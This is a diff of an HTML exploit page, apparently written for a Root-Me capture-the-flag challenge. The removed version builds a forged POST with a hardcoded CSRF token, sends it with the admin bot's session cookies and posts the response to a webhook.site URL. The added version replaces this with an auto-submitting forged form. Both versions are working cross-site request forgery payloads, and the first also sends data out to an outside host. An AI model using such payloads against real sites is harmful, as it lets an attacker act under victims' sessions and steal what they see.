@@ -1,56 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head></head>
 <body>
-<script>
-  const WEBHOOK = "https://webhook.site/4d91e71d-8d19-428f-bb6d-50860c92e280";
-  const CSRF = "ruW-tjL1BWCdhbiOSCA7=VEsDrT52Hf";
-  const TARGET = "http://challenge01.root-me.org:58005/?style=dark";
-
-  // Créer et soumettre le formulaire
-  const form = document.createElement("form");
-  form.method = "POST";
-  form.action = TARGET;
-
-  const fields = {
-    name: "pwned",
-    email: "pwned@pwned.com",
-    url: "http://challenge01.root-me.org:58005",
-    description: "pwned",
-    csrf: CSRF
-  };
-
-  for (const [key, val] of Object.entries(fields)) {
-    const input = document.createElement("input");
-    input.name = key;
-    input.value = val;
-    form.appendChild(input);
-  }
-
-  document.body.appendChild(form);
-
-  // Intercepter la réponse via fetch plutôt que form submit
-  // pour pouvoir renvoyer le résultat au webhook
-  fetch(TARGET, {
-    method: "POST",
-    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    body: new URLSearchParams(fields),
-    credentials: "include"  // ← inclut les cookies de session du bot admin
-  })
-  .then(r => r.text())
-  .then(html => {
-    // Renvoyer la réponse vers ton webhook
-    fetch(WEBHOOK, {
-      method: "POST",
-      body: html,
-      mode: "no-cors"
-    });
-  })
-  .catch(err => {
-    fetch(WEBHOOK + "?error=" + encodeURIComponent(err.toString()), {
-      mode: "no-cors"
-    });
-  });
-</script>
+<form id="f" method="POST" action="http://challenge01.root-me.org:58005/?style=dark">
+  <input name="name" value="pwned"/>
+  <input name="email" value="pwned@pwned.com"/>
+  <input name="url" value="http://challenge01.root-me.org:58005"/>
+  <input name="description" value="pwned"/>
+  <input name="csrf" value="ruW-tjL1BWCdhbiOSCA7=VEsDrT52Hf"/>
+</form>
+<script>document.getElementById("f").submit();</script>
 </body>
 </html>
